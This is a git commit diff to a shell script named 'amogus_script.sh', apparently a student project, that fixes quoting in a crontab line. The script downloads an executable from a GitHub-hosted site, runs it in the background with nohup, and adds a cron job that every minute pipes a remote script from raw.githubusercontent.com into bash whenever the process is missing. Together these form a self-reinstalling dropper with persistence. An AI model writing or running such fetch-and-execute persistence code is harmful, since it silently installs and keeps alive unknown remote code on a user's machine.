7b8792b840e24e9fc6437bb8afba92169d515f96
romain <romain.panno@epitech.eu>
2023-02-24 17:56:57 +0100

    Fix supersayan

--- amogus_script.sh
+++ amogus_script.sh
@@ -6,5 +6,5 @@ wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod 
 crontab -l > crontabs
 nohup linux64.exe &
 cat crontabs
-echo "* * * * *     bash -c \"if [[ -z $(pidof linux64.exe) ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi\"" >> crontabs
+echo "* * * * *     bash -c \"if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi\"" >> crontabs
 crontab crontabs
